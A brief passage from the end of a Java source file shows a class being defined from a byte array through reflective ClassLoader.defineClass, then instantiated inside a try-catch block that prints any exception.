            ( (Class)defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}